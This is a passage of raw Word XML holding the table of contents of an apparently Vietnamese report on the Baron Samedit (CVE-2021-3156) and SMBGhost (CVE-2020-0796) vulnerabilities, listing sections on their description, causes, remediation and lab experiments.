            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277773 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>8</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="49DB9326" w14:textId="6B841ED9" w:rsidR="00746169" w:rsidRDefault="00746169">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9059"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc185277774" w:history="1">
        <w:r w:rsidRPr="00B24740">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:eastAsia="Times New Roman"/>
            <w:noProof/>
            <w:lang w:val="en-AU" w:bidi="th-TH"/>
          </w:rPr>
          <w:t>2.1 CVE-2021-3156 (Baron Samedit)</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277774 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>8</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="07A8E7EF" w14:textId="6390D864" w:rsidR="00746169" w:rsidRDefault="00746169">
      <w:pPr>
        <w:pStyle w:val="TOC3"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc185277775" w:history="1">
        <w:r w:rsidRPr="00B24740">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:val="en-AU" w:bidi="th-TH"/>
          </w:rPr>
          <w:t>2.1.1 Mô tả</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277775 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>8</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="75D6681B" w14:textId="572E9D96" w:rsidR="00746169" w:rsidRDefault="00746169">
      <w:pPr>
        <w:pStyle w:val="TOC3"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc185277776" w:history="1">
        <w:r w:rsidRPr="00B24740">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:eastAsia="Calibri"/>
            <w:noProof/>
            <w:lang w:val="en-AU" w:bidi="th-TH"/>
          </w:rPr>
          <w:t>2.1.2 Nguyên nhân xảy ra</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277776 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>10</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3D64BB0F" w14:textId="6F4ADA41" w:rsidR="00746169" w:rsidRDefault="00746169">
      <w:pPr>
        <w:pStyle w:val="TOC3"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc185277777" w:history="1">
        <w:r w:rsidRPr="00B24740">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:val="en-AU" w:bidi="th-TH"/>
          </w:rPr>
          <w:t>2.1.3 Cách khắc phục lỗ hổng</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277777 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>12</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5C6913FA" w14:textId="257876FC" w:rsidR="00746169" w:rsidRDefault="00746169">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9059"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc185277778" w:history="1">
        <w:r w:rsidRPr="00B24740">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:eastAsia="Times New Roman"/>
            <w:noProof/>
            <w:lang w:val="en-AU" w:bidi="th-TH"/>
          </w:rPr>
          <w:t>2.2 CVE-2020-0796 (SMBGhost)</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277778 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>13</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="46303C61" w14:textId="595B0258" w:rsidR="00746169" w:rsidRDefault="00746169">
      <w:pPr>
        <w:pStyle w:val="TOC3"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc185277779" w:history="1">
        <w:r w:rsidRPr="00B24740">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:eastAsia="Times New Roman"/>
            <w:noProof/>
            <w:lang w:val="en-AU" w:bidi="th-TH"/>
          </w:rPr>
          <w:t>2.2.1 Mô tả</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277779 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>13</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="438937EB" w14:textId="3D12CD1B" w:rsidR="00746169" w:rsidRDefault="00746169">
      <w:pPr>
        <w:pStyle w:val="TOC3"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc185277780" w:history="1">
        <w:r w:rsidRPr="00B24740">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:eastAsia="Times New Roman"/>
            <w:noProof/>
            <w:lang w:val="en-AU" w:bidi="th-TH"/>
          </w:rPr>
          <w:t>2.2.2 Nguyên nhân xảy ra</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277780 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>14</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="023314AE" w14:textId="7343BCAC" w:rsidR="00746169" w:rsidRDefault="00746169">
      <w:pPr>
        <w:pStyle w:val="TOC3"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc185277781" w:history="1">
        <w:r w:rsidRPr="00B24740">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:eastAsia="Times New Roman"/>
            <w:noProof/>
            <w:lang w:val="en-AU" w:bidi="th-TH"/>
          </w:rPr>
          <w:t>2.2.3 Cách khắc phục lỗ hổng</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277781 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>19</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7CAD16AC" w14:textId="2BED2B1B"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82" w:history="1">
        <w:r w:rsidRPr="00B24740">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>CHƯƠNG 3. TRIỂN KHAI THỰC NGHIỆM</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277782 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>23</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="174BBEEC" w14:textId="7DE163C7" w:rsidR="00746169" w:rsidRDefault="00746169">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9059"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc185277783" w:history="1">
        <w:r w:rsidRPr="00B24740">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>3.1 CVE-2021-3156 (Baron Samedit)</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277783 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>23</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4FE826A5" w14:textId="2CB6463D" w:rsidR="00746169" w:rsidRDefault="00746169">
      <w:pPr>
        <w:pStyle w:val="TOC3"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc185277784" w:history="1">
        <w:r w:rsidRPr="00B24740">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>3.1.1 Xây dựng phòng thực nghiệm</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277784 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>23</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="181F69A7" w14:textId="06A6ACBD" w:rsidR="00746169" w:rsidRDefault="00746169">
      <w:pPr>
        <w:pStyle w:val="TOC3"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc185277785" w:history="1">
        <w:r w:rsidRPr="00B24740">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>3.1.2 Tiến hành thực nghiệm</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277785 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>24</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0824D9C1" w14:textId="4CE737B1" w:rsidR="00746169" w:rsidRDefault="00746169">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9059"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc185277786" w:history="1">
        <w:r w:rsidRPr="00B24740">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>3.2 CVE-2020-0796 (SMBGhost)</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277786 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>32</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="08C2696E" w14:textId="2CB942BD" w:rsidR="00746169" w:rsidRDefault="00746169">
      <w:pPr>
        <w:pStyle w:val="TOC3"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc185277787" w:history="1">
        <w:r w:rsidRPr="00B24740">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>3.2.1 Mô hình</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277787 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>32</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="255349CC" w14:textId="1AC7A92E" w:rsidR="00746169" w:rsidRDefault="00746169">
      <w:pPr>
        <w:pStyle w:val="TOC3"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc185277788" w:history="1">
        <w:r w:rsidRPr="00B24740">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>3.2.2 Kịch bản</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc185277788 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>33</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0742F0BA" w14:textId="6D99EBA8" w:rsidR="00746169" w:rsidRDefault="00746169">
      <w:pPr>
        <w:pStyle w:val="TOC3"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc185277789" w:history="1">
        <w:r w:rsidRPr="00B24740">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
